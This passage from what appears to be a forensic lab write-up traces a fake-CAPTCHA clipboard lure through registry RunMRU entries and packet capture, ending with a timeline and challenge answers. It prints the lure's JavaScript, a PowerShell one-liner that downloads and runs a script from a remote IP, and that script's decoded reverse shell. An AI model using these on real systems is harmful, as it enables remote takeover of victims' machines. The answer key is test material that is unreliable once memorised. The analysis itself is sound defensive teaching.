        const revershell=`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
        const suffix = " # "
        const ploy = "... ''I am not a robot - reCAPTCHA Verification ID: "
        const end = "''"
        const textToCopy = revershell

        setClipboardCopyData(textToCopy);
    }

```

Others involve generating and showing the second window with the instructions.

### Reverse Shell

#### office2024install.ps1

The file is encoded PowerShell:

```

powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIANAAzAC4AMgAwADUALgAxADEANQAuADQANAAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=

```

It’s SHA256 is 579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de (Task 3):

```

oxdf@hacky$ sha256sum office2024install.ps1 
579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de  office2024install.ps1

```

With some Bash foo I’ll get the plaintext:

```

oxdf@hacky$ cat office2024install.ps1 | cut -d' ' -f3 | base64 -d | tr ';' '\n'
$client = New-Object System.Net.Sockets.TCPClient("43.205.115.44",6969)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
$sendback = (iex $data 2>&1 | Out-String )
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()}
$client.Close()

```

This is a PowerShell reverse shell connecting to 43.205.115.44 on port 6969 (Task 4).

#### Connection

I’ll filter in Wireshark to get that IP and port:

```

ip.addr==43.205.115.44 and tcp.port==6969

```

Following the resulting TCP stream shows the reverse shell activity:

![image-20241021143307441](/img/image-20241021143307441.png)

It runs `whoami`, then typos `ifconfig` before running `ipconfig`. Then it downloads BloodHound.

The SYN packet is sent at 05:07:48:

[![image-20241021143507637](/img/image-20241021143507637.png)*Click for full size image*](/img/image-20241021143507637.png)

The session closes at 5:14:31. That means a total connection time of six minutes and forty three seconds, or 403 seconds (Task 5).

### Registry Analysis (Reg Explorer)

#### Load NTUSER.DAT

The `RunMRU` regisrtry key logs command run via the “Run” dialog box. This is logged for each user, so for Happy Grunwald, I’ll need `C:\Users\happy.grunwald\NTUSER.DAT`.

I’ll open [Registry Explorer](https://ericzimmerman.github.io/#!index.md) and select this file. It pops up saying it needs the transaction logs:

![image-20241021150554563](/img/image-20241021150554563.png)

I’ll click “Yes” and select the two logs:

![image-20241021150626706](/img/image-20241021150626706.png)

It asks me to save the updated hive, and then opens it.

#### RunMRU

I’ll filter on “runmru” to get the key:

![image-20241021150737812](/img/image-20241021150737812.png)

There are two values for this key:

![image-20241021150810038](/img/image-20241021150810038.png)

There’s the command that was run, as well as the time it was run (Task 2). There’s also the full command again (Task 1).

### Registry Analysis (WinRegFS)

#### Mount Hive

Alternatively, on Linux, I can use [winregfs](https://manpages.ubuntu.com/manpages/lunar/man8/mount.winregfs.8.html) (`apt install winregfs`) to mount the hive as a filesystem. This isn’t a complete solution, as I couldn’t get timestamps from it. But it’s still a tool worth knowing about. Something like [Chainsaw](https://github.com/WithSecureLabs/chainsaw) could also give a fuller solution on Linux.

I’ll mount it with the `mount.winregfs` command:

```

oxdf@hacky$ mount.winregfs C/Users/happy.grunwald/NTUSER.DAT happy.ntuser
oxdf@hacky$ ls happy.ntuser
 AppEvents   Console  'Control Panel'   Environment   EUDC  'Keyboard Layout'   Microsoft   Network   Printers   Software   System   Uninstall

```

#### RunMRU

To find the RunMRU key, I’ll use `find` with `-iname` to look for a filename case-insensitively:

```

oxdf@hacky$ find . -iname '*runmru*'
./Software/Microsoft/Windows/CurrentVersion/Explorer/RunMRU

```

I’ll go into that directory and there are the values:

```

oxdf@hacky$ cd ./Software/Microsoft/Windows/CurrentVersion/Explorer/RunMRU
oxdf@hacky$ ls
a.sz  b.sz  MRUList.sz

```

`MRUList.sz` is the order of the items:

```

oxdf@hacky$ cat MRUList.sz 
ba

```

The items have the commands run:

```

oxdf@hacky$ cat a.sz 
%tmp%\1
oxdf@hacky$ cat b.sz 
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1

```

This is nice for getting the content, though it doesn’t give the timestamps.

### Timeline

Putting all that together makes the following timeline:

| Time (UTC) | Description | Reference |
| --- | --- | --- |
| 5:07:45 | Command Run | RunMRU (NTUSER.DAT) |
| 5:07:47 | GET /office2024installer.ps1 | PCAP |
| 5:07:48 | Reverse shell connection | PCAP |
| 5:14:31 | Reverse shell disconnection | PCAP |

### Question Answers
1. It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

   `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`
2. At what time in UTC did the malicious payload execute?

   2024-09-23 05:07:45
3. The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?

   579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de
4. To which port did the reverse shell connect?

   6969
5. For how many seconds was the reverse shell connection established between C2 and the victim’s workstation?

   403
6. Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim’s clipboard?

   `stageClipboard`